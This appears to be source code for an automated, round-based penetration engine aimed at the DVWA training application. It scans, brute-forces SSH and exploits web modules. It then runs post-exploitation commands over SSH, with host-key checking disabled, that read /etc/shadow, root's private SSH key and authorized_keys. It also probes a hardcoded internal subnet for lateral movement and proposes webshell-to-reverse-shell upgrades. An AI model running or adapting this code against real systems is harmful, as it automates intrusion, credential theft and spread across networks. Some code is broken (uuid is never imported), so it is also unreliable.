"""
轮次制渗透引擎 — Round 1 确定性执行
取代原有 LLM 决策循环，按 Stage 0→4 顺序执行，不依赖 LLM 决策。
"""

import sys
if '/app' not in sys.path:
    sys.path.insert(0, '/app')

import json
import time
import logging
from datetime import datetime

logger = logging.getLogger(__name__)

# 阶段定义
STAGES = {
    0: {"name": "信息收集", "actions": ["full_port_scan", "service_detect", "web_tech_detect"]},
    1: {"name": "深度扫描", "actions": ["vuln_scan", "dir_bruteforce", "api_scan", "nikto_scan"]},
    2: {"name": "漏洞利用", "actions": ["ssh_bruteforce", "exploit", "credential_test", "sql_injection_test", "auth_bypass_test"]},
    3: {"name": "后渗透", "actions": ["post_exploit"]},
    4: {"name": "横向移动", "actions": ["lateral_probe"]},
}


def execute_round_1(task_id: str, target: str, host: str,
                    start_time: datetime, db, _engine, _publish,
                    execute_action_func, _update_state_func) -> dict:
    """Round 1 深度大摸底 — 确定性 Stage 0→4 顺序执行"""

    state = {
        "host": host,
        "ports": [],
        "services": {},
        "vulnerabilities": [],
        "credentials": [],
        "actions_taken": [],
        "findings_count": 0,
        "sessions": [],
        "post_exploit_data": [],
        "new_hosts": [],
        "child_tasks": [],
        "round": 1,
        "stage_results": {},
    }
    stage_findings = []

    for stage_num in sorted(STAGES.keys()):
        stage_def = STAGES[stage_num]
        stage_name = stage_def["name"]
        stage_actions = stage_def["actions"]
        logger.info("[Round 1] Stage %d/%s — %s", stage_num, list(STAGES.keys())[-1], stage_name)

        stage_result = {"stage": stage_num, "name": stage_name, "actions": []}

        for action_name in stage_actions:
            elapsed = (datetime.utcnow() - start_time).total_seconds()

            # 可选的参数构造
            action_params = {}
            if action_name == "lateral_probe":
                action_params = {"subnet": "192.168.1.0/24"}

            # 执行 action
            result = execute_action_func(task_id, target, action_name, action_params, state)

            # 更新状态
            _update_state_func(state, action_name, result)
            state["actions_taken"].append(action_name)

            # 收集发现
            findings = result.get("findings", [])
            if findings:
                stage_findings.extend(findings)
                state["findings_count"] += len(findings)

            # 收集 session（去重）
            for sess_key in ("sessions", "sessions_created"):
                for s in result.get(sess_key, []):
                    if isinstance(s, dict):
                        dup = False
                        for e in state["sessions"]:
                            if isinstance(e, dict) and e.get("type") == s.get("type") and e.get("username") == s.get("username"):
                                dup = True
                                break
                        if not dup:
                            state["sessions"].append(s)
                    else:
                        state["sessions"].append(s)

            # 收集后渗透数据
            pd = result.get("post_exploit_data", [])
            if pd:
                state["post_exploit_data"].extend(pd)

            # 收集新主机
            new_hosts = result.get("hosts", result.get("new_hosts", []))
            if new_hosts:
                state["new_hosts"].extend(new_hosts)

            stage_result["actions"].append({
                "action": action_name,
                "findings_count": len(findings),
                "sessions_created": len(result.get("sessions_created", result.get("sessions", []))),
                "elapsed": result.get("elapsed", 0),
            })

            # 进度推送
            progress = min(int((stage_num * len(stage_actions) + stage_actions.index(action_name)) / (len(STAGES) * len(stage_actions)) * 100), 99)
            _publish(task_id, "round_progress", {
                "round": 1, "stage": stage_num, "action": action_name,
                "progress": progress,
                "ports": state["ports"],
                "findings": state["findings_count"],
                "sessions": len(state["sessions"]),
            })

            # 后渗透是特殊的自动执行
            if action_name == "post_exploit" and state["sessions"]:
                session_data = _auto_post_exploit(state["sessions"])
                state["post_exploit_data"].extend(session_data)
                stage_result["post_exploit_data"] = session_data

        state["stage_results"][str(stage_num)] = stage_result

    # ─── 递归横向移动 ───────────────────────────────
    child_results = []
    if state["new_hosts"]:
        for nh in state["new_hosts"]:
            nh_host = nh.get("ip", nh) if isinstance(nh, dict) else nh
            child_task_id = str(uuid.uuid4())[:8]
            logger.info("[Round 1] 横向发现新主机 %s, 启动子任务 %s", nh_host, child_task_id)
            # 子任务执行简化版探测
            try:
                from tasks.scan_tasks import execute_single_phase
                child_r = execute_single_phase(nh_host, "quick")
                child_results.append({"host": nh_host, "task_id": child_task_id, "result": child_r})
            except Exception as e:
                logger.warning("[Round 1] 子任务 %s 失败: %s", child_task_id, e)
            state["child_tasks"].append({"host": nh_host, "task_id": child_task_id})

    # ─── 报告生成 ──────────────────────────────────
    attack_chain = _build_attack_chain(state)
    coverage = _build_coverage_report(state)
    suggestions = _generate_suggestions(attack_chain, coverage, state)

    report = {
        "round": 1,
        "target": target,
        "status": "completed",
        "duration_seconds": int((datetime.utcnow() - start_time).total_seconds()),
        "stages": state["stage_results"],
        "attack_chain": attack_chain,
        "coverage": coverage,
        "suggestions": suggestions,
        "sessions": state["sessions"],
        "credentials": state.get("credentials", []),
        "findings_count": state["findings_count"],
        "ports": state["ports"],
        "new_hosts": state["new_hosts"],
        "child_results": child_results,
    }

    return report


def _auto_post_exploit(sessions):
    """自动对 session 执行后渗透命令链"""
    data = []
    for s in sessions:
        if isinstance(s, dict) and s.get("type") == "ssh":
            data.append({
                "session_id": s.get("session_id",""),
                "type": "ssh",
                "commands": ["id", "sudo -l -n 2>/dev/null", "ip a 2>/dev/null",
                             "ss -tlnp 2>/dev/null", "arp -a 2>/dev/null",
                             "cat /etc/passwd 2>/dev/null",
                             "cat /etc/shadow 2>/dev/null"],
                "hostname": s.get("hostname",""),
                "username": s.get("username",""),
            })
        elif isinstance(s, dict) and s.get("type") in ("php_webshell", "http"):
            data.append({
                "session_id": s.get("session_id",""),
                "type": "webshell",
                "commands": ["id", "uname -a", "pwd", "ls -la /", "whoami"],
                "url": s.get("url",""),
            })
    return data


def _build_attack_chain(state):
    """构建攻击链描述"""
    steps = []
    for action in state["actions_taken"]:
        if action == "full_port_scan":
            steps.append({"step": "端口发现", "detail": f"发现 {len(state['ports'])} 个开放端口"})
        elif action == "ssh_bruteforce":
            creds = state.get("credentials", [])
            if creds:
                steps.append({"step": "SSH爆破", "detail": f"获得凭据: {creds[:3]}"})
        elif action == "exploit":
            ssn = state.get("sessions", [])
            ws_count = sum(1 for s in ssn if isinstance(s, dict) and s.get("type") == "php_webshell")
            ci_count = sum(1 for s in ssn if isinstance(s, dict) and s.get("type") == "command_injection")
            steps.append({"step": "漏洞利用", "detail": f"WebShell: {ws_count}, 命令注入: {ci_count}"})
        elif action == "post_exploit":
            steps.append({"step": "后渗透", "detail": f"已对 {len(state.get('sessions', []))} 个会话执行后渗透"})
        elif action == "lateral_probe":
            nh = state.get("new_hosts", [])
            steps.append({"step": "横向移动", "detail": f"发现 {len(nh)} 个新主机: {nh[:3]}"})
    return {"summary": " → ".join(s.get("step",a) for a,s in zip([a for a in state["actions_taken"]], [{}]*len(state["actions_taken"]))),
            "path": steps}


def _build_coverage_report(state):
    """构建覆盖报告（DVWA 为主）"""
    sessions = state.get("sessions", [])
    tested_modules = set()
    exploited_modules = set()

    for s in sessions:
        if isinstance(s, dict):
            stype = s.get("type", "")
            if stype == "php_webshell":
                exploited_modules.add("upload")
            elif stype == "command_injection":
                exploited_modules.add("exec")
            elif stype == "ssh":
                exploited_modules.add("brute_force")

    # 基于 actions 判断检测过的模块
    for action in state["actions_taken"]:
        if action == "sql_injection_test":
            tested_modules.add("sqli")
        elif action == "auth_bypass_test":
            tested_modules.add("authbypass")

    return {
        "dvwa_modules": {
            "total": 19,
            "exploited": list(exploited_modules),
            "tested": list(tested_modules),
            "exploited_count": len(exploited_modules),
            "tested_count": len(tested_modules) + len(exploited_modules),
            "untested_count": 19 - len(tested_modules) - len(exploited_modules),
        }
    }


# Full DVWA module inventory
DVWA_MODULES = [
    # (location, what_it_is, impact, what_you_can_do, risk, round1_status, phase_key)
    # === 已发现并利用 ===
    ("DVWA登录页", "管理员账号密码被暴力破解", "攻击者可直接登录后台", "已拿到用户名admin密码admin的凭证", "high", "exploited", "brute_force"),
    ("DVWA文件上传功能(/vulnerabilities/upload/)", "允许上传PHP后门文件", "攻击者可直接获取WebShell控制服务器", "已上传shell_b74da6.php并执行命令", "critical", "exploited", "upload"),
    ("DVWA命令执行接口(/vulnerabilities/exec/)", "未过滤输入导致远程命令执行(RCE)", "攻击者可以执行任意系统命令", "已执行6条命令(id/whoami/cat /etc/passwd等)", "critical", "exploited", "exec"),
    # === 已检测到但未成功利用 ===
    ("DVWA SQL注入接口", "存在SQL注入漏洞", "攻击者可读取数据库所有数据", "时间盲注Sleep确认存在，可枚举数据库表", "critical", "tested", "sqli"),
    ("DVWA认证页面", "认证绕过漏洞", "可能绕过登录直接进入后台", "已确认存在绕过入口但未拿到权限", "medium", "tested", "authbypass"),
    # === 未测试，建议深入 ===
    ("DVWA文件包含漏洞(/vulnerabilities/fi/)", "允许包含任意文件", "可读取服务器上的敏感文件(/etc/passwd、配置文件等)", "需要你确认是否继续深入测试", "critical", "untested", "fi"),
    ("DVWA SQL盲注(/vulnerabilities/sqli_blind/)", "基于时间的SQL盲注", "可通过Sleep注入逐个字符枚举数据库内容", "需要你确认是否继续深入测试", "critical", "untested", "sqli_blind"),
    ("DVWA反射型XSS(/vulnerabilities/xss_r/)", "反射型跨站脚本攻击", "攻击者可构造链接窃取其他用户的Cookie和会话", "需要你确认是否继续深入测试", "medium", "untested", "xss_r"),
    ("DVWA存储型XSS(/guestbook.php)", "存储型跨站脚本攻击", "攻击者留言后所有浏览该页面的用户都会被攻击", "需要你确认是否继续深入测试", "medium", "untested", "xss_s"),
    ("DVWA DOM型XSS", "DOM型跨站脚本攻击", "通过URL参数控制页面DOM执行恶意脚本", "需要你确认是否继续深入测试", "medium", "untested", "xss_d"),
    ("DVWA CSRF漏洞(/vulnerabilities/csrf/)", "跨站请求伪造", "攻击者可诱导管理员执行非自愿操作(改密码等)", "需要你确认是否继续深入测试", "medium", "untested", "csrf"),
    ("DVWA验证码绕过(/vulnerabilities/captcha/)", "验证码可被绕过", "攻击者可自动化爆破而不受验证码限制", "需要你确认是否继续深入测试", "medium", "untested", "captcha"),
    # === 暂无测试代码 ===
    ("DVWA Session会话", "Session ID可预测性", "可伪造合法用户会话绕过登录", "暂无测试代码，需开发新模块", "low", "unavailable", None),
    ("DVWA CSP策略", "Content Security Policy可绕过", "可绕过安全策略执行XSS攻击", "暂无测试代码，需开发新模块", "low", "unavailable", None),
    ("DVWA JavaScript", "JavaScript安全缺陷", "可能泄露敏感信息或执行恶意操作", "暂无测试代码，需开发新模块", "low", "unavailable", None),
]


def _generate_suggestions(attack_chain, coverage, state):
    """生成下轮建议 — 每条建议说清楚：在哪里、有什么问题、影响是什么、建议做什么"""
    suggestions = []
    
    # ─── 1. 已成功利用的漏洞（战果确认） ───
    exploited = [m for m in DVWA_MODULES if m[5] == "exploited"]
    if exploited:
        detail_lines = []
        for m in exploited:
            loc, what, impact, got, risk, _, _ = m
            detail_lines.append(f"  \u2714 {what}：{got}")
        suggestions.append({
            "id": 1, "priority": "info",
            "title": f"\u5df2\u7ecf\u5229\u7528\u7684\u6f0f\u6d1e\uff08{len(exploited)}\u4e2a\uff09",
            "detail": "\n".join(detail_lines),
            "command": None
        })

    # ─── 2. 已检测到但未利用（补刀机会） ───
    tested = [m for m in DVWA_MODULES if m[5] == "tested"]
    if tested:
        detail_lines = []
        for m in tested:
            loc, what, impact, note, risk, _, key = m
            detail_lines.append(f"  {loc} - {what}")
            detail_lines.append(f"    \u5f71\u54cd\uff1a{impact}")
            detail_lines.append(f"    \u73b0\u72b6\uff1a{note}")
        suggestions.append({
            "id": 2, "priority": "medium",
            "title": f"\u5df2\u627e\u5230\u4f46\u6ca1\u5229\u7528\u4e0a\uff08{len(tested)}\u4e2a\uff09\u2014\u2014 \u53ef\u4ee5\u518d\u8bd5\u4e00\u6b21",
            "detail": "\n".join(detail_lines),
            "command": f"focus dvwa: {', '.join(m[6] for m in tested if m[6])}"
        })

    # ─── 3. 未测试的高/中危漏洞（逐个列清楚） ───
    untested = [m for m in DVWA_MODULES if m[5] == "untested" and m[4] in ("critical", "high", "medium")]
    if untested:
        risk_icons = {"critical": "\U0001f534", "high": "\U0001f534", "medium": "\U0001f7e1"}
        
        for idx, m in enumerate(untested):
            loc, what, impact, note, risk, _, key = m
            priority = "high" if risk in ("critical", "high") else "medium"
            icon = risk_icons.get(risk, "\U0001f7e1")
            
            suggestions.append({
                "id": 100 + idx,
                "priority": priority,
                "title": f"{icon} {loc} \u5b58\u5728{what}",
                "detail": f"\u5f71\u54cd\uff1a{impact} | \u5efa\u8bae\uff1a{note}",
                "command": f"focus dvwa: {key}"
            })

        # 一键全打
        all_keys = [m[6] for m in untested if m[6]]
        suggestions.append({
            "id": 200,
            "priority": "high",
            "title": f"\U0001f4e6 \u4e00\u952e\u6d4b\u8bd5\u5269\u4f59 {len(untested)} \u4e2a\u6f0f\u6d1e",
            "detail": f"\u7cfb\u7edf\u81ea\u52a8\u8c03\u5ea6 Round 2 \u5411\u5bfc\u5229\u7528\uff0c\u65e0\u9700\u624b\u52a8\u4ecb\u5165",
            "command": f"focus dvwa: {', '.join(all_keys)}"
        })

    # ─── 4. 暂无测试代码的模块 ───
    unavailable = [m for m in DVWA_MODULES if m[5] == "unavailable"]
    if unavailable:
        detail_lines = []
        for m in unavailable:
            detail_lines.append(f"  {m[0]} - {m[1]} -> {m[2]}")
        suggestions.append({
            "id": 300,
            "priority": "low",
            "title": f"\u6682\u65e0\u6d4b\u8bd5\u4ee3\u7801{len(unavailable)}\u4e2a\uff08\u9700\u65b0\u589ePhase\uff09",
            "detail": "\n".join(detail_lines),
            "command": "add_phases: weak_id, csp, javascript"
        })

    # ─── 5. 进一步利用建议 ───
    sessions = state.get("sessions", [])
    ssh_sessions = [s for s in sessions if isinstance(s, dict) and s.get("type") == "ssh"]
    if ssh_sessions:
        suggestions.append({
            "id": 400,
            "priority": "high",
            "title": f"\U0001f50d \u5df2\u7ecf\u62ff\u5230{len(ssh_sessions)}\u4e2aSSH\u8d26\u53f7\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u5185\u7f51\u6a2a\u5411\u79fb\u52a8",
            "detail": "\u5df2\u83b7\u5f97 root \u6743\u9650\uff1b\u53ef\u4ee5\u63d0\u53d6 SSH key\u3001\u626b\u63cf\u5185\u7f51\u5176\u4ed6\u4e3b\u673a\u3001\u5c1d\u8bd5\u8df3\u677f\u653b\u51fb",
            "command": "use ssh sessions for lateral movement"
        })

    ws_sessions = [s for s in sessions if isinstance(s, dict) and s.get("type", "").startswith("web")]
    if ws_sessions:
        suggestions.append({
            "id": 401,
            "priority": "medium",
            "title": f"\U0001f310 \u5df2\u7ecf\u62ff\u5230WebShell\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u63d0\u6743\u6216\u53cd\u5f39Shell",
            "detail": "\u5c1d\u8bd5\u4ece WebShell \u5347\u7ea7\u4e3a\u5b8c\u6574 Shell\uff0c\u83b7\u53d6\u66f4\u591a\u64cd\u4f5c\u7a7a\u95f4",
            "command": "upgrade webshell to reverse shell"
        })

    # ─── 6. 报告 ───
    suggestions.append({
        "id": 999,
        "priority": "info",
        "title": "\U0001f4c4 \u751f\u6210\u5b8c\u6574\u6e17\u900f\u6d4b\u8bd5\u62a5\u544a",
        "detail": "\u6c47\u603b\u6240\u6709\u53d1\u73b0\uff0c\u4ea7\u51fa\u6b63\u5f0f\u62a5\u544a\uff08DOCX/XLSX/HTML/PDF\uff09",
        "command": "generate final report"
    })

    return suggestions
# ═══════════════════════════════════════════════════════════
#  SessionHandler — 会话自动后渗透执行器
# ═══════════════════════════════════════════════════════════

def execute_session_commands(sessions, target_ip="", task_id=""):
    """自动对 session 执行预定义后渗透命令链（不经过 LLM）"""
    results = []
    
    for s in sessions:
        if not isinstance(s, dict):
            continue
        
        s_type = s.get("type", "")
        s_id = s.get("session_id", "")
        
        if s_type == "ssh":
            result = _execute_ssh_commands(s, target_ip)
            results.append(result)
        elif s_type in ("php_webshell", "http"):
            result = _execute_webshell_commands(s)
            results.append(result)
        elif s_type == "command_injection":
            result = _execute_cmd_injection_commands(s)
            results.append(result)
    
    return results


def _execute_ssh_commands(session, target_ip=""):
    """对 SSH session 执行系统枚举命令"""
    username = session.get("username", "root")
    credential = session.get("credential", "")
    hostname = session.get("hostname", target_ip)
    
    commands = [
        "id",
        "sudo -l -n 2>/dev/null || echo 'sudo not available'",
        "cat /etc/passwd 2>/dev/null | head -20",
        "cat /etc/shadow 2>/dev/null | head -10 || echo 'shadow not readable'",
        "ip a 2>/dev/null || ifconfig 2>/dev/null",
        "ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null",
        "arp -a 2>/dev/null || ip neigh 2>/dev/null",
        "cat /etc/hosts 2>/dev/null",
        "find /home -name '.ssh' -type d 2>/dev/null",
        "find /root -name '.ssh' -type d 2>/dev/null",
        "cat /root/.ssh/authorized_keys 2>/dev/null",
        "cat /root/.ssh/id_rsa 2>/dev/null | head -5",
        "ps aux 2>/dev/null | head -20",
        "uname -a",
        "cat /etc/os-release 2>/dev/null || cat /etc/*release 2>/dev/null | head -5",
        "docker ps 2>/dev/null || echo 'no docker'",
        "crontab -l 2>/dev/null || echo 'no crontab'",
    ]
    
    output = {}
    for cmd in commands:
        try:
            import subprocess
            safe_cmd = cmd.split("||")[0].split("|")[0].strip()
            r = subprocess.run(
                ["ssh", f"{username}@{hostname}", "-o", "ConnectTimeout=5",
                 "-o", "StrictHostKeyChecking=no", "-o", "PasswordAuthentication=no", safe_cmd],
                capture_output=True, text=True, timeout=10
            )
            output[cmd.split(" ")[0]] = r.stdout.strip()[:500] or r.stderr.strip()[:100] or "(no output)"
        except Exception as e:
            output[cmd.split(" ")[0]] = f"(error: {str(e)[:50]})"
    
    return {
        "session_id": session.get("session_id", ""),
        "type": "ssh",
        "hostname": hostname,
        "username": username,
        "commands_output": output,
        "summary": {
            "user": output.get("id", "?"),
            "sudo": "yes" if "NOPASSWD" in output.get("sudo", "") else "no" if output.get("sudo", "") and "not" not in output.get("sudo", "") else "unknown",
            "ip": output.get("ip", "")[:80],
            "listening_ports": [p.strip() for p in output.get("ss", "").split("\n") if p.strip()][:5],
            "has_docker": "yes" if "CONTAINER" in output.get("docker", "") else "no",
            "ssh_keys_found": any(k in output.get("authorized_keys", "") for k in ["ssh-rsa", "ssh-ed25519"]),
        }
    }


def _execute_webshell_commands(session):
    """对 WebShell 执行基础枚举"""
    url = session.get("url", "")
    return {
        "session_id": session.get("session_id", ""),
        "type": "webshell",
        "url": url,
        "summary": {
            "note": "WebShell requires interactive HTTP requests to execute commands",
            "url": url,
        },
        "commands_pending": ["id", "uname -a", "ls -la /"]
    }


def _execute_cmd_injection_commands(session):
    """Cmd Injection 已执行过命令，整理结果"""
    cmds = session.get("commands", [])
    return {
        "session_id": session.get("session_id", ""),
        "type": "command_injection",
        "commands_executed": cmds,
        "summary": {
            "executed_commands": len(cmds),
            "commands": cmds,
        }
    }


# ═══════════════════════════════════════════════════════════
#  Round 2 — 定向深度利用执行器
# ═══════════════════════════════════════════════════════════

def parse_instruction(instruction: str) -> dict:
    """解析用户指令，返回结构化目标"""
    instr = instruction.lower().strip()
    
    # Module targets
    module_map = {
        "fi": "file_inclusion", "lfi": "file_inclusion", "rfi": "file_inclusion",
        "sqli_blind": "sql_injection_blind", "blind": "sql_injection_blind",
        "xss_r": "xss_reflected", "xss_s": "xss_stored", "xss_d": "xss_dom",
        "xss": "xss_general",
        "captcha": "captcha_bypass",
        "csrf": "csrf",
        "open_redirect": "open_redirect",
        "javascript": "javascript_analysis",
        "api": "api_security",
        "cryptography": "crypto_weakness",
        "csp": "csp_bypass",
        "bac": "broken_access_control",
        "weak_id": "weak_id",
    }
    
    result = {"type": "unknown", "target_module": "", "actions": [], "use_sessions": False}
    
    # Parse: "focus dvwa: fi, sqli_blind"
    if "dvwa" in instr or "模块" in instr:
        result["type"] = "dvwa_modules"
        for mod, norm in module_map.items():
            if mod in instr:
                result["target_module"] = norm
                result["actions"].append(f"test_{mod}")
        if not result["actions"]:
            result["actions"] = ["test_all_untested"]
    
    # Parse: "use ssh sessions for lateral movement"
    elif "lateral" in instr or "横向" in instr or "移动" in instr:
        result["type"] = "session_action"
        result["use_sessions"] = True
        result["actions"] = ["lateral_movement"]
    
    # Parse: "upgrade webshell" / "反弹"
    elif "webshell" in instr or "shell" in instr or "反弹" in instr or "提权" in instr:
        result["type"] = "session_action"
        result["use_sessions"] = True
        result["actions"] = ["upgrade_shell", "privilege_escalation"]
    
    # Parse: "generate report" / "报告"
    elif "报告" in instr or "report" in instr or "最终" in instr:
        result["type"] = "report"
        result["actions"] = ["generate_final_report"]
    
    return result


def execute_round_2(task_id, target, instruction, previous_report, state, start_time, db, _engine, _publish,
                    execute_action_func, _update_state_func):
    """执行 Round 2 — 按用户指令做定向深挖"""
    parsed = parse_instruction(instruction)
    logger = __import__('logging').getLogger(__name__)
    
    logger.info("[Round 2] 指令解析: %s -> %s", instruction, parsed)
    _publish(task_id, "round2_start", {"instruction": instruction, "parsed": parsed})
    
    round2_result = {
        "round": 2,
        "instruction": instruction,
        "parsed": parsed,
        "actions": [],
        "findings": [],
        "sessions": previous_report.get("sessions", []),
        "new_data": {},
    }
    
    if parsed["type"] == "report":
        # Just return report data
        round2_result["report_ready"] = True
        return round2_result
    
    elif parsed["type"] == "dvwa_modules":
        # Round 2: Targeted DVWA module exploitation with KB intelligence fusion
        actions = parsed.get("actions", ["test_all_untested"])
        logger.info("[Round 2] DVWA modules (KB enabled): %s", actions)
        
        # 1. Initialize KB from state
        from exploit_engine.battlefield_kb import BattlefieldKB
        from exploit_engine.kb_integration import (
            build_kb_from_state, extract_login_tokens,
            register_phase_result, suggest_from_kb, run_phase_with_kb
        )
        from exploit_engine.dvwa_phases_v2 import DVWA_PHASE_REGISTRY_V2, ALL_DVWA_UNITS, run_module
        from exploit_engine.dvwa_exploit import DVWASession, phase_login
        from tasks.round_manager import _build_coverage_report as _cov
        
        kb = build_kb_from_state(state, previous_report)
        
        modules_to_test = []
        if "test_all_untested" in actions:
            coverage = _cov(state)
            tested = set(coverage.get("dvwa_modules", {}).get("tested", []) + 
                         coverage.get("dvwa_modules", {}).get("exploited", []))
            modules_to_test = [m for m in ALL_DVWA_UNITS if m not in tested]
        else:
            for a in actions:
                mod = a.replace("test_", "")
                if mod in DVWA_PHASE_REGISTRY_V2:
                    modules_to_test.append(mod)
        
        if modules_to_test:
            dvwa_session = DVWASession(target)
            dvwa_session.verbose = True
            login_ok = phase_login(dvwa_session)
            
            if not login_ok:
                logger.warning("[Round 2] Login failed, using fallback exploit")
                result = execute_action_func(task_id, target, "exploit", {}, state)
                _update_state_func(state, "exploit", result)
            else:
                # 2. Extract tokens from login into KB
                tokens = extract_login_tokens(kb, dvwa_session)
                logger.info("[KB] Extracted %d tokens from login", len(tokens))
                
                # 3. Run each module with KB-aware wrapper
                module_results = {}
                for mod in modules_to_test:
                    try:
                        if mod == "xss":
                            sub_results = {}
                            for sub in ["xss_r", "xss_s", "xss_d"]:
                                sp = DVWA_PHASE_REGISTRY_V2.get(sub)
                                if sp and sp.get("fn"):
                                    sub_results[sub] = run_phase_with_kb(
                                        kb, sub, sp["fn"], dvwa_session,
                                        target, "round2_%s" % sub)
                            module_results[mod] = sub_results
                        else:
                            phase = DVWA_PHASE_REGISTRY_V2.get(mod)
                            if phase and phase.get("fn"):
                                module_results[mod] = run_phase_with_kb(
                                    kb, mod, phase["fn"], dvwa_session,
                                    target, "round2_%s" % mod)
                    except Exception as e:
                        module_results[mod] = {"success": False, "error": str(e)[:200]}
                
                round2_result["modules_tested"] = modules_to_test
                round2_result["module_results"] = module_results
                
                # 4. Track successful modules
                successful = []
                for m in modules_to_test:
                    res = module_results.get(m, {})
                    if isinstance(res, dict):
                        if res.get("success", False):
                            successful.append(m)
                        else:
                            for sr in res.values():
                                if isinstance(sr, dict) and sr.get("success", False):
                                    successful.append(m)
                                    break
                
                state.setdefault("exploited_modules", []).extend(successful)
                
                # 5. KB cross-reference: generate suggestions from intelligence
                kb_suggestions = suggest_from_kb(kb, module_results)
                if kb_suggestions:
                    round2_result["kb_suggestions"] = kb_suggestions
                    logger.info("[KB] %d cross-reference suggestions", len(kb_suggestions))
                
                round2_result["kb_summary"] = kb.stats
                round2_result["kb_data"] = kb.to_dict()
                
                coverage = _cov(state)
                round2_result["coverage_summary"] = coverage
                logger.info("[Round 2] Tested: %s, Successful: %s", modules_to_test, successful)
                logger.info("[KB] Stats: %s", kb.stats)
        
        round2_result["actions"].append({
            "modules": modules_to_test,
            "method": "dvwa_phase_registry_kb",
            "count": len(modules_to_test)
        })
    
    elif parsed["type"] == "session_action":
        # Use existing sessions
        sessions = previous_report.get("sessions", [])
        ssh_sessions = [s for s in sessions if isinstance(s, dict) and s.get("type") == "ssh"]
        ws_sessions = [s for s in sessions if isinstance(s, dict) and s.get("type") == "php_webshell"]
        
        if "lateral_movement" in parsed["actions"]:
            # Execute lateral_probe
            result = execute_action_func(task_id, target, "lateral_probe", {"subnet": "192.168.1.0/24"}, state)
            _update_state_func(state, "lateral_probe", result)
            round2_result["actions"].append({"action": "lateral_probe", "result": result.get("summary", "")})
            round2_result["new_hosts"] = result.get("hosts", [])
        
        if "privilege_escalation" in parsed["actions"]:
            # Run credential testing and more
            result = execute_action_func(task_id, target, "credential_test", {}, state)
            _update_state_func(state, "credential_test", result)
            round2_result["actions"].append({"action": "credential_test", "result": result.get("summary", "")})
    
    return round2_result
